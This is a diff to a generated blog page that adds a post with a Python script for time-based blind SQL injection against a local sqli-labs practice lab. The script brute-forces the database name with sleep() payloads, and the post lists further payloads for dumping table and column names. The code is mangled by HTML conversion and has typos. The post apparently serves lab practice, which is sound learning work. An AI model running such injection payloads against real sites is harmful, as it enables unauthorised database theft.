@@ -71,6 +71,38 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-python盲注脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.548Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding:utf-8"></a>coding:utf-8</h1><p>import requests<br>import datetime<br>import time</p>
+<h1 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h1><p>def database_len():<br>    for i in range(1, 10):<br>        url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>        payload &#x3D; “ ?id&#x3D;1’ and if(length(database())&gt;%s,sleep(1),0) –+” % i<br>        # print(url+payload+’%23’)<br>        time1 &#x3D; datetime.datetime.now()<br>        r &#x3D; requests.get(url + payload)<br>        time2 &#x3D; datetime.datetime.now()<br>        sec &#x3D; (time2 - time1).seconds<br>        if sec &gt;&#x3D; 1:<br>            print(i)<br>        else:<br>            print(i)<br>            break<br>    print(‘database_len:’, i)</p>
+<p>#获取数据库名<br>def database_name():<br>    name &#x3D; ‘’<br>    for j in range(1,9):<br>        for i in ‘0123456789abcdefghijklmnopqrstuvwxyz’:<br>            url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>            payload &#x3D; “?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) –+” % (j,i)<br>            #print(url+payload)<br>            time1 &#x3D; datetime.datetime.now()<br>            r &#x3D; requests.get(url + payload)<br>            time2 &#x3D; datetime.datetime.now()<br>            sec &#x3D; (time2 - time1).seconds<br>            if sec &gt;&#x3D;3:<br>                name +&#x3D; i<br>                print(name)<br>                break<br>    print(‘database_name:’, name)</p>
+<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    database_name()<br>?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) – +<br>暴表：<br>?id&#x3D;1’ and if(substr(select table_ name from information_schema.tables where table_schema&#x3D;database(),%d,1))<br>爆列：<br>?id&#x3D;1’ and if(substr(select columns_name from infomation_schema.columns where table_shema&#x3D;database(),%d,1))<br>————————————————</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" data-id="cl22vvyyp000il4vjdmkw0010" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-python对用户输入进行限制（only number）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/04/17/python%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%BF%9B%E8%A1%8C%E9%99%90%E5%88%B6%EF%BC%88only%20number%EF%BC%89/" class="article-date">
@@ -436,6 +468,10 @@
       <ul>
         
           <li>
+            <a href="/2022/04/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
@@ -449,10 +485,6 @@
         
           <li>
             <a href="/2022/04/17/less%2029~31/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/17/less%2018~22/">(no title)</a>
           </li>
         
       </ul>
